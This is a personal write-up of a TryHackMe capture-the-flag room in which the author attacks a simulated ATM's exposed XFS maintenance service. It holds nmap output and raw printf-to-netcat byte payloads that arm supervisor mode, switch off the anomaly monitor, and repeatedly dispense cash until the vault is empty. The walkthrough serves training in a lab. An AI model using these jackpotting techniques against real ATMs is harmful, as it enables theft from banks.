---
created: 2026-10-10
tags:
  - note
  - journal
  - cyberStuff
title: Jackpot
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-11T12:15:16.691Z
---
link:<https://tryhackme.com/room/jackpot>\
Description:

```
A branch ATM at "Earth's National Bank" has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine's native hardware language with no authentication worth the name.

The cash dispenser doesn't care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
```

3 ports opened on the first scan

```bash
┌──(k㉿kali)-[~/Desktop]
└─ nmap -sV -p- --min-rate 5000 <YOUR_IP>

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 07:17 -0400
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 61.52% done; ETC: 07:17 (0:00:05 remaining)
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 07:17 (0:00:03 remaining)
Nmap scan report for 10.114.179.22 (10.114.179.22)
Host is up (0.037s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
9100/tcp open  jetdirect?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.58 seconds

```

the web server gives us a file to download\
![](/images/blog-ul-meu/static/Pasted%20image%2020261010092334.png)\
will run it later, let's investigate the other port opened.\
The other opened port is 9100 which nmap tells us is jetdirect

```
HP JetDirect is a network printing protocol primarily used for sending print jobs directly to network-connected printers. It utilizes TCP port 9100 for raw printing, offering a simple and direct method for print data transfer.
```

we will use it later, let's run the file for now :\
![](/images/blog-ul-meu/static/Pasted%20image%2020261011072735.png)\
the jackpot file is some kind of encoder that will return us a code for the web-server\
![](/images/blog-ul-meu/static/Pasted%20image%2020261011072857.png)\
lets investigate the JetDirect service :

```bash
┌──(k㉿kali)-[~/Downloads]
└─ echo cv | nc <YOUR_IP>  9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}
```

ok cool , we can send messages directly to the service using the format specified,

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x01\x00\x00\x03\x03\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}�"rc": "WFS_SUCCESS", "cassettes": [{"id": "CST1", "denom": 10, "count": 0}, {"id": "CST2", "denom": 20, "count": 0}, {"id": "CST3", "denom": 50, "count": 0}, {"id": "CST4", "denom": 100, "count": 0}], "remaining_notes": 0}
```

here are the commands we can execute on the machine using the 9100 port

```json
{
  "rc": "WFS_SUCCESS",
  "interface": "Branch Engineering Gateway (XFS bridge)",
  "device_class": "CDM",
  "commands": {
    "WFS_INF_CDM_STATUS": "0x301",
    "WFS_INF_CDM_CASH_UNIT_INFO": "0x303",
    "WFS_INF_CDM_CAPABILITIES": "0x304",
    "WFS_CMD_CDM_DISPENSE": "0x401",
    "WFS_CMD_CDM_ARM": "0x4f0",
    "WFS_CMD_CDM_SET_MONITOR": "0x4f1",
    "WFS_CMD_CDM_GET_FLAG": "0x4ff"
  },
  "max_dispense": 40
}
```

Ok so we can use the ./jackpot binary to get a code to set the ATM in supervisor mode, we have to specify x08 because that is the length of the code

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\xf0\x00\x08<YOUR_CODE>' | nc <YOUR_IP> 9100

�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}:{"rc": "WFS_SUCCESS", "detail": "armed - supervisor mode"}
```

after that we can make the first transaction using `"WFS_CMD_CDM_DISPENSE": "0x401",`

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\x01\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}I{"rc": "WFS_SUCCESS", "notes": 40, "value": 4000, "remaining_notes": 240}^C

```

but if we try to make another transaction the same way the service will be blocked for 45 second and it will reset :

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\x01\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}{{"rc": "WFS_ERR_CDM_LOCKED", "detail": "anomalous dispense with null transaction id -> machine locked", "lock_seconds": 45}
```

the web server:\
![](/images/blog-ul-meu/static/Pasted%20image%2020261010100440.png)\
so what can we do in this case ?\
(for the record i tried a lot of different ways to solve this, from racing condition to waiting some time thinking it was a cooldown system in place, none of them were true, i was much simpler)

Looking back at the command list for the service we can see that there is a set monitor command

```bash
"WFS_CMD_CDM_SET_MONITOR": "0x4f1",
```

so what if we try to set the monitor off using this?\
using this payload we can achieve that `'\x02\x00\x00\x04\xf1\x00\x03off'` , the payload basically overwrites the monitor settings , x03 is the length of the string "off"

```bash
┌──(k㉿kali)-[~/Desktop]
└─ printf '\x02\x00\x00\x04\xf1\x00\x03off' | nc <YOUR_IP> 9100 | xxd

00000000: 01c5 7b22 7365 7276 6963 6522 3a20 2242  ..{"service": "B
00000010: 7261 6e63 6820 456e 6769 6e65 6572 696e  ranch Engineerin
00000020: 6720 4761 7465 7761 7922 2c20 2270 726f  g Gateway", "pro
00000030: 746f 636f 6c22 3a20 2258 4653 2062 7269  tocol": "XFS bri
00000040: 6467 6522 2c20 2272 6571 7565 7374 5f66  dge", "request_f
00000050: 6f72 6d61 7422 3a20 2231 2062 7974 6520  ormat": "1 byte
00000060: 6d73 675f 7479 7065 202b 2034 2062 7974  msg_type + 4 byt
00000070: 6520 6269 672d 656e 6469 616e 2063 6f6d  e big-endian com
00000080: 6d61 6e64 2069 6420 2b20 3220 6279 7465  mand id + 2 byte
00000090: 2062 6967 2d65 6e64 6961 6e20 6c65 6e67   big-endian leng
000000a0: 7468 202b 203c 6c65 6e67 7468 3e20 6279  th + <length> by
000000b0: 7465 7320 6f66 2064 6174 6122 2c20 2272  tes of data", "r
000000c0: 6570 6c79 5f66 6f72 6d61 7422 3a20 2232  eply_format": "2
000000d0: 2062 7974 6520 6269 672d 656e 6469 616e   byte big-endian
000000e0: 206c 656e 6774 6820 2b20 3c6c 656e 6774   length + <lengt
000000f0: 683e 2062 7974 6573 206f 6620 4a53 4f4e  h> bytes of JSON
00000100: 2028 7468 6973 2062 616e 6e65 7220 7573   (this banner us
00000110: 6573 2074 6865 2073 616d 6520 6672 616d  es the same fram
00000120: 696e 6729 222c 2022 6d73 675f 7479 7065  ing)", "msg_type
00000130: 7322 3a20 7b22 4745 5449 4e46 4f22 3a20  s": {"GETINFO":
00000140: 2230 7830 3122 2c20 2245 5845 4355 5445  "0x01", "EXECUTE
00000150: 223a 2022 3078 3032 227d 2c20 2268 696e  ": "0x02"}, "hin
00000160: 7422 3a20 2271 7565 7279 2063 6f6d 6d61  t": "query comma
00000170: 6e64 2030 7830 3330 3420 2857 4653 5f49  nd 0x0304 (WFS_I
00000180: 4e46 5f43 444d 5f43 4150 4142 494c 4954  NF_CDM_CAPABILIT
00000190: 4945 5329 2077 6974 6820 6d73 675f 7479  IES) with msg_ty
000001a0: 7065 2047 4554 494e 464f 2066 6f72 2074  pe GETINFO for t
000001b0: 6865 2066 756c 6c20 636f 6d6d 616e 6420  he full command
000001c0: 7461 626c 6522 7d00 2a7b 2272 6322 3a20  table"}.*{"rc":
000001d0: 2257 4653 5f53 5543 4345 5353 222c 2022  "WFS_SUCCESS", "
000001e0: 6d6f 6e69 746f 725f 6f6e 223a 2066 616c  monitor_on": fal
000001f0: 7365 7d                                  se}
```

and it works cool , now we can make as many transactions as we need.

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\x01\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}I{"rc": "WFS_SUCCESS", "notes": 40, "value": 4000, "remaining_notes": 240}^C

┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\x01\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}I{"rc": "WFS_SUCCESS", "notes": 40, "value": 2000, "remaining_notes": 200}^C
```

cool ,\
the web-server:\
![](/images/blog-ul-meu/static/Pasted%20image%2020261011075704.png)\
after spamming the dispense command we see the following :

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\x01\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}{"rc": "WFS_SUCCESS", "notes": 40, "value": 400, "remaining_notes": 0, "detail": "vault empty - cashout proven; GET_FLAG now available"}^C

```

and we get the flag using x04 xff :

```bash
┌──(k㉿kali)-[~/Downloads]
└─ printf '\x02\x00\x00\x04\xff\x00\x00' | nc <YOUR_IP> 9100
�"service": "Branch Engineering Gateway", "protocol": "XFS bridge", "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data", "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)", "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"}, "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"}V{"rc": "WFS_SUCCESS", "flag": "[REDACTED_solve it YOURSELF]"}^C
```

cool room
